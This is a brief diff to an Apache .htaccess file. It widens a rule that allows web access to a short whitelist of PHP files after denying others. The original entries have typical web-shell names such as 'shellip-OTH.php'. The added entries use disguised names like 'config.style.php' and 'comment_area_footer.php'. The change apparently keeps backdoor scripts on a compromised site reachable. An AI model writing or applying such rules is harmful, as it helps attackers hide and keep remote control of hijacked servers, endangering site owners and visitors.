@@ -3,7 +3,7 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(shellip-OTH.php|memek-OTH.PHP|jadihaji.php)$">
+<FilesMatch "^(shellip-OTH.php|memek-OTH.PHP|config.style.php|jadihaji.php|framework.php|style.php|PKPStyle.inc.php|index.php|program.php|comment_area_footer.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
